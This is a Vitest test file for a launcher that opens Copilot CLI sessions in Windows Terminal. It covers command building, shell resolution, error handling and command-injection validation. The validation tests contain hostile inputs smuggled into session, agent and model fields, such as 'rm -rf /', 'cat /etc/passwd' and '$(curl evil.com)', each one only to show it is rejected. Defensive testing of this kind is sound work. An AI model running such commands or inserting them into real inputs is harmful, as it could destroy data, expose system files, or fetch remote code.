import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { spawn } from 'child_process';
import { LaunchManager } from '../src/main/launch';
import type { LaunchOptions } from '../src/main/launch';

// Mock child_process
vi.mock('child_process', () => ({
  spawn: vi.fn(() => ({ unref: vi.fn() })),
  execFile: vi.fn(),
  execFileSync: vi.fn(() => 'C:\\Program Files\\PowerShell\\7\\pwsh.exe\n'),
  execSync: vi.fn(() => 'C:\\Program Files\\nodejs\\copilot.cmd\n'),
}));

// Mock shells module to return predictable results
vi.mock('../src/main/shells', () => ({
  getShells: vi.fn(() => [
    { name: 'pwsh', path: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe', displayName: 'PowerShell 7', isDefault: true },
    { name: 'cmd', path: 'C:\\Windows\\System32\\cmd.exe', displayName: 'Command Prompt', isDefault: false },
  ]),
  getTerminals: vi.fn(() => [
    { name: 'windows-terminal', path: 'C:\\Users\\test\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe', displayName: 'Windows Terminal', isDefault: true, supportsNewTab: true },
    { name: 'cmd', path: 'C:\\Windows\\System32\\cmd.exe', displayName: 'Command Prompt Window', isDefault: false, supportsNewTab: false },
  ]),
}));

const spawnMock = vi.mocked(spawn);

describe('LaunchManager', () => {
  let launcher: LaunchManager;

  beforeEach(() => {
    launcher = new LaunchManager();
    spawnMock.mockClear();
    spawnMock.mockReturnValue({ unref: vi.fn() } as any);
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe('launch', () => {
    it('uses Windows Terminal with -w dispatch and new-tab', () => {
      Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });

      launcher.launch('test-id');

      const binary = spawnMock.mock.calls[0][0] as string;
      const args = spawnMock.mock.calls[0][1] as string[];
      expect(binary).toBe('wt.exe');
      expect(args).toContain('-w');
      expect(args).toContain('dispatch');
      expect(args).toContain('new-tab');
      expect(args).toContain('--title');
    });

    it('builds basic resume command', () => {
      launcher.launch('abc-123');

      const args = spawnMock.mock.calls[0][1] as string[];
      const commandArg = args.find((a) => a.includes('copilot --resume abc-123'));
      expect(commandArg).toBeDefined();
    });

    it('includes --allow-all flag when yoloMode is true', () => {
      launcher.launch('abc-123', { yoloMode: true });

      const args = spawnMock.mock.calls[0][1] as string[];
      const commandArg = args.find((a) => a.includes('--allow-all'));
      expect(commandArg).toBeDefined();
    });

    it('includes --agent flag when specified', () => {
      launcher.launch('abc-123', { agent: 'developer' });

      const args = spawnMock.mock.calls[0][1] as string[];
      const commandArg = args.find((a) => a.includes('--agent developer'));
      expect(commandArg).toBeDefined();
    });

    it('includes --model flag when specified', () => {
      launcher.launch('abc-123', { model: 'claude-sonnet-4' });

      const args = spawnMock.mock.calls[0][1] as string[];
      const commandArg = args.find((a) => a.includes('--model claude-sonnet-4'));
      expect(commandArg).toBeDefined();
    });

    it('uses customCommand when provided', () => {
      launcher.launch('abc-123', { customCommand: 'echo hello' });

      const args = spawnMock.mock.calls[0][1] as string[];
      const commandArg = args.find((a) => a.includes('echo hello'));
      expect(commandArg).toBeDefined();
    });

    it('combines all flags correctly', () => {
      launcher.launch('sess-id', {
        yoloMode: true,
        agent: 'tester',
        model: 'gpt-5',
      });

      const args = spawnMock.mock.calls[0][1] as string[];
      const commandArg = args.find((a) => a.includes('copilot --resume sess-id --allow-all --agent tester --model gpt-5'));
      expect(commandArg).toBeDefined();
    });
  });

  describe('shell resolution', () => {
    it('uses cmd.exe when cmd shell specified', () => {
      launcher.launch('test-id', { shell: 'cmd' });

      const args = spawnMock.mock.calls[0][1] as string[];
      expect(args).toContain('cmd.exe');
      expect(args).toContain('/k');
    });

    it('returns error when shell not found', () => {
      const result = launcher.launch('test-id', { shell: 'nonexistent' });

      expect(result.success).toBe(false);
      expect(result.error).toContain('No suitable shell');
    });
  });

  describe('input validation (command injection prevention)', () => {
    it('rejects session IDs with shell metacharacters (;)', () => {
      const result = launcher.launch('valid-id; rm -rf /');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session ID');
      expect(spawnMock).not.toHaveBeenCalled();
    });

    it('rejects session IDs with ampersand', () => {
      const result = launcher.launch('id && calc.exe');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session ID');
    });

    it('rejects session IDs with pipe operator', () => {
      const result = launcher.launch('id | cat /etc/passwd');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session ID');
    });

    it('rejects session IDs with $() subshell', () => {
      const result = launcher.launch('$(whoami)');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session ID');
    });

    it('rejects session IDs with backticks', () => {
      const result = launcher.launch('`id`');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session ID');
    });

    it('rejects session IDs exceeding 128 characters', () => {
      const longId = 'a'.repeat(129);
      const result = launcher.launch(longId);
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session ID');
    });

    it('rejects session IDs starting with a dot', () => {
      const result = launcher.launch('.hidden-id');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session ID');
    });

    it('accepts valid UUID-style session IDs', () => {
      const result = launcher.launch('a1b2c3d4-e5f6-7890-abcd-ef1234567890');
      expect(result.success).toBe(true);
    });

    it('rejects agent name with shell metacharacters', () => {
      const result = launcher.launch('valid-id', { agent: 'test; rm -rf /' });
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid agent name');
    });

    it('rejects model name with shell metacharacters', () => {
      const result = launcher.launch('valid-id', { model: '$(curl evil.com)' });
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid model name');
    });

    it('accepts valid agent and model names', () => {
      const result = launcher.launch('valid-id', { agent: 'coding-agent', model: 'claude-sonnet-4.5' });
      expect(result.success).toBe(true);
    });
  });

  describe('launchMulti', () => {
    it('launches multiple sessions', () => {
      const results = launcher.launchMulti(['id-1', 'id-2', 'id-3']);

      expect(results).toHaveLength(3);
      expect(results.every((r) => r.success)).toBe(true);
      expect(spawnMock).toHaveBeenCalledTimes(3);
    });

    it('returns individual results for each session', () => {
      const results = launcher.launchMulti(['id-1', 'id-2'], { shell: 'nonexistent' });

      expect(results).toHaveLength(2);
      expect(results[0].success).toBe(false);
      expect(results[1].success).toBe(false);
    });
  });

  describe('spawn error handling', () => {
    it('handles ENOENT error gracefully', () => {
      spawnMock.mockImplementation(() => {
        const err = new Error('spawn ENOENT') as NodeJS.ErrnoException;
        err.code = 'ENOENT';
        throw err;
      });

      const result = launcher.launch('test-id');

      expect(result.success).toBe(false);
      expect(result.error).toContain('not found');
    });

    it('handles EACCES error gracefully', () => {
      spawnMock.mockImplementation(() => {
        const err = new Error('spawn EACCES') as NodeJS.ErrnoException;
        err.code = 'EACCES';
        throw err;
      });

      const result = launcher.launch('test-id');

      expect(result.success).toBe(false);
      expect(result.error).toContain('Permission denied');
    });
  });
});
